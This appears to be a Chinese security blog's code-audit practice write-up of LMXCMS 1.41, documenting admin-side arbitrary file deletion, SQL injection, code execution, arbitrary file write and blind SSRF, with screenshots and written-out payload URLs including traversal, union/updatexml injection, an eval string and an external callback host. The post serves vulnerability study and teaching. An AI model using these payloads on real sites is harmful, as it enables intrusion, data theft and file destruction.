---
title: php审计练习 lmxcms1.41
subtitle:
date: 2024-08-15T09:31:01+08:00
slug: 20
draft:  false
author: 
  name: 东隅
  link:
  email: 735587142
  avatar: 
description:
keywords:
license:
comment: false
weight: 0
tags:
  - 代码审计
  -  php安全
categories:
  - 代码审计
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter




---

<!--more-->

安装

<img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405120230789.webp" alt="image-20240512023053565" style="zoom:50%;" />

http://127.0.0.1/index.php?m=类前缀&a=类内方法

url基本就是这样的

web根目录放了一个Index.php和一个admin.php，他们分别定义了RUN_TYPE，又分别包含了run.inc.php，如果是从admin.php进，就是后台的那一套方法

![image-20240520105022255](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201050404.webp)

# 后台任意文件删除

漏洞位置:BackdbAction.class.php

这个删除行为没有做任何鉴权，只要登录了后台就可以进行操作

![image-20240520104259138](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201042490.webp)

跟进delOne方法，它直接拼接了，没有采取任何过滤

![image-20240520105544567](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201055656.webp)

甚至可以跨目录删除 /admin.php?m=Backdb&a=delbackdb&filename=../flag.txt



接下来再看另一个批量删除delmorebackdb方法

![image-20240520105851827](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201058944.webp)

filename换成数组post传过去就行了

![image-20240520110718000](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201107273.webp)



# 后台SQL注入

漏洞位置：AcquisiAction.class.php

cid的值会被拼接到where后面进行sql执行

![image-20240520113709206](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201137292.webp)



![image-20240520113704325](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201137411.webp)



![image-20240520113750586](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201137713.webp)

跟进where函数

![image-20240520113813829](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201138968.webp)



```
http://localhost/admin.php?m=Acquisi&a=showCjData&id=1&lid=1&cid=1 union select updatexml(1,concat(0x7e,(select @@version),0x7e),1)

http://localhost/admin.php?m=Acquisi&a=showCjData&id=1&lid=1&cid=-1 union select 1,2,3,4,database(),6,7-- -
```





# 后台代码执行

漏洞位置：AcquisiAction.class.php

存在SQL注入  代码执行

showCjData中lid和id只要存在就行，cid对应lmx_cj_data内的id字段

在表内加入这条数据

eval(‘$data=1;phpinfo();//‘)

访问

/admin.php?m=Acquisi&a=showCjData&cid=1&lid=3&id=1



# 后台任意文件写入

**漏洞位置：**TemplateAction.class.php

poc如下

![image-20240520145130396](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201451575.webp)

定位到这里

![image-20240520145150122](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201451292.webp)

跟进put方法，未作过滤

![image-20240520145211177](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201452270.webp)

dir控制上传的位置，filename和temcontent分别控制文件名和内容

它也可以覆盖文件



# 后台无回显ssrf漏洞

**漏洞位置：**/c/admin/AcquisiAction.class.php

```
GET /admin.php?m=Acquisi&a=testListContentUrl&listurl=http://t6n089.ceye.io
```

一直跟进，没有任何过滤，最后好像是通过php内置的curl进行http请求

![image-20240520150957185](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201509335.webp)



![image-20240520151011027](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201510210.webp)



![image-20240520151026809](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201510032.webp)













































